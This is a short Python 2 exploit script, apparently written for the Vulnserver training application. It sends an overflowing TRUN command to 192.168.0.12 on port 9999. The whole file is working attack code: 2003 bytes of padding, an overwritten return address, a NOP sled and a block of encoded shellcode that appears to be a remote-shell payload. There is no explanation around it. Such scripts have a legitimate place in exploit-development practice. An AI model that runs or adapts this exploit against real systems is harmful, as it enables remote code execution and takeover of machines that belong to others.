#!/usr/bin/python
import sys, socket

overflow = (
"\xba\xf2\xd0\x1e\xc6\xd9\xe8\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x52\x83\xc6\x04\x31\x56\x0e\x03\xa4\xde\xfc\x33\xb4\x37\x82"
"\xbc\x44\xc8\xe3\x35\xa1\xf9\x23\x21\xa2\xaa\x93\x21\xe6\x46"
"\x5f\x67\x12\xdc\x2d\xa0\x15\x55\x9b\x96\x18\x66\xb0\xeb\x3b"
"\xe4\xcb\x3f\x9b\xd5\x03\x32\xda\x12\x79\xbf\x8e\xcb\xf5\x12"
"\x3e\x7f\x43\xaf\xb5\x33\x45\xb7\x2a\x83\x64\x96\xfd\x9f\x3e"
"\x38\xfc\x4c\x4b\x71\xe6\x91\x76\xcb\x9d\x62\x0c\xca\x77\xbb"
"\xed\x61\xb6\x73\x1c\x7b\xff\xb4\xff\x0e\x09\xc7\x82\x08\xce"
"\xb5\x58\x9c\xd4\x1e\x2a\x06\x30\x9e\xff\xd1\xb3\xac\xb4\x96"
"\x9b\xb0\x4b\x7a\x90\xcd\xc0\x7d\x76\x44\x92\x59\x52\x0c\x40"
"\xc3\xc3\xe8\x27\xfc\x13\x53\x97\x58\x58\x7e\xcc\xd0\x03\x17"
"\x21\xd9\xbb\xe7\x2d\x6a\xc8\xd5\xf2\xc0\x46\x56\x7a\xcf\x91"
"\x99\x51\xb7\x0d\x64\x5a\xc8\x04\xa3\x0e\x98\x3e\x02\x2f\x73"
"\xbe\xab\xfa\xd4\xee\x03\x55\x95\x5e\xe4\x05\x7d\xb4\xeb\x7a"
"\x9d\xb7\x21\x13\x34\x42\xa2\xdc\x61\x90\xb6\xb5\x73\x28\xa6"
"\x19\xfd\xce\xa2\xb1\xab\x59\x5b\x2b\xf6\x11\xfa\xb4\x2c\x5c"
"\x3c\x3e\xc3\xa1\xf3\xb7\xae\xb1\x64\x38\xe5\xeb\x23\x47\xd3"
"\x83\xa8\xda\xb8\x53\xa6\xc6\x16\x04\xef\x39\x6f\xc0\x1d\x63"
"\xd9\xf6\xdf\xf5\x22\xb2\x3b\xc6\xad\x3b\xc9\x72\x8a\x2b\x17"
"\x7a\x96\x1f\xc7\x2d\x40\xc9\xa1\x87\x22\xa3\x7b\x7b\xed\x23"
"\xfd\xb7\x2e\x35\x02\x92\xd8\xd9\xb3\x4b\x9d\xe6\x7c\x1c\x29"
"\x9f\x60\xbc\xd6\x4a\x21\xdc\x34\x5e\x5c\x75\xe1\x0b\xdd\x18"
"\x12\xe6\x22\x25\x91\x02\xdb\xd2\x89\x67\xde\x9f\x0d\x94\x92"
"\xb0\xfb\x9a\x01\xb0\x29")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 16 + overflow

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.0.12',9999))
        s.send(('TRUN /.:/' + shellcode))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()

